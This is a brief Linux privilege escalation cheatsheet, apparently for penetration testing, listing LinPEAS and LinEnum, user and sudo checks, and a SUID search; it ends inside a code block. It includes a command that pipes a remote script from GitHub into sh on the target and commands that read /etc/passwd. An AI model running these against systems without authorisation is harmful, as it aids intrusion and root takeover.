# 🐧 Linux Privilege Escalation Cheatsheet

A quick checklist for finding local privilege escalation vectors on Linux machines.

## 🛠️ Automated Tools
When possible, transfer these to the target machine and run them.
* **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**: `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
* **[LinEnum](https://github.com/rebootuser/LinEnum)**: `bash LinEnum.sh`

## 👤 User & Group Information
* `whoami` - Current user
* `id` - Current user's groups (Look for `sudo`, `docker`, `lxd`)
* `cat /etc/passwd` - List all users
* `sudo -l` - Check what commands the current user can run as root! (Very common vector)

## 🗄️ SUID/SGID Binaries
Find binaries that execute with the permissions of the file owner (usually root).
```bash
# Find all SUID files
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
